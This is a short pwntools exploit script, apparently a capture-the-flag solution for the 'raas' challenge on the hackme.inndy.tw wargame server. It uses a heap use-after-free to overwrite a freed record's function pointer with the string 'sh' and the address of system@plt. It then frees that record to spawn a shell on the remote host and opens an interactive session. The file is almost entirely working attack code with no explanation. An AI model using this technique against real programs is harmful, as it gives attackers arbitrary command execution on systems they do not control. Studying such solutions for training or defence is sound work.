from pwn import *
context.log_level = 'debug'

elf = ELF('./raas')
#p = process('./raas',env = {"LD_PREOLOAD":"../libc-2.23.so.i386"})
p = remote('hackme.inndy.tw',7719)

def new(index,ty,value,length = 0):
	p.sendlineafter('Act > ','1')
	p.sendlineafter('Index > ',str(index))
	p.sendlineafter('Type > ',str(ty))
	if ty == 2:
		p.sendlineafter('Length > ',str(length))
	p.sendlineafter('Value > ',str(value))

def delete(index):
	p.sendlineafter('Act > ','2')
	p.sendlineafter('Index > ',str(index))

def show(index):
	p.sendlineafter('Act > ','3')
	p.sendlineafter('Index > ',str(index))

system_plt = elf.plt['system']

#hijack records[1]
new(0,1,1)
new(1,2,'aaaa',0x10)
delete(1)
delete(0)
#gdb.attach(p)
#system('sh\')
new(2,2, 'sh\x00\x00' + p32(system_plt),0xc)

delete(1)

p.interactive()